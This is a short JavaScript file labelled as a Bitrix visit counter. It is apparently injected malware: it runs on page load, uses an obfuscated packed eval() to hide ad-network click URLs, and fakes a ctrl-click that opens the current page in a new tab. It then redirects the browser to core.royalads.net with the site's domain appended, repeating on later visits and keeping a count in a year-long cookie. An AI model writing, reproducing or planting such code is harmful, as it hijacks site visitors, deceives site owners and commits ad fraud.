// init visit counter
var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + 'BITRIX_SM_CNT'.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));   
var SM_CNT = matches ? decodeURIComponent(matches[1]) : 0; SM_CNT = parseInt(SM_CNT);
var SM_VARIANT = Math.floor(Math.random()*4);
if (SM_CNT == 0 || SM_VARIANT == 0) {
  var SM_INDEX = SM_CNT%7;
  if (SM_CNT < 8) {
      var lapaln = window.location.host.split('.');
      
      eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('b a=["4://3.6.0/1/?5=9-7-8-c-d&2=","4://3.6.0/1/?5=i-e-f-g-h&2="];',19,19,'net|click|s|core|https|pub|royalads|31c7|4606|1876a5d7|cdnstat|var|8dd4|667ef1711443|7cac|4eca|8f9a|fef2011acb0b|8f0246be'.split('|'),0,{}));
  
      if (SM_INDEX < cdnstat.length) {
        var terraget=cdnstat[SM_INDEX]+lapaln[lapaln.length-2];
        var adar = document.createElement("a");
        adar.href = window.location.href;
        var evtter = document.createEvent("MouseEvents");
        evtter.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, true, false, false, false, 0, null);
        adar.dispatchEvent(evtter);
        
        window.location.href=terraget;
      }
  }
  SM_CNT = SM_CNT+1;
  document.cookie = "BITRIX_SM_CNT="+SM_CNT+"; max-age=31536000; path=/";
}
